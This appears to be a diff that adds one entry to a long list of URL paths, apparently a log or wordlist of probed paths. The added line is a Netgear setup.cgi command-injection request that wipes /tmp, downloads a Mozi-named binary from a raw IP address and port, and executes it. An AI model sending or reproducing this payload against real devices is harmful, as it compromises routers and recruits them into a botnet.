@@ -11556,3 +11556,4 @@ http://www.ip138.com/
 /?gad_source=5&gclid=EAIaIQobChMIuODgmLCciwMV7o6sAh1G5TdaEAEYASAAEgJp2vD_BwE
 /panel
 /.svn
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.164.177.56:10825/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
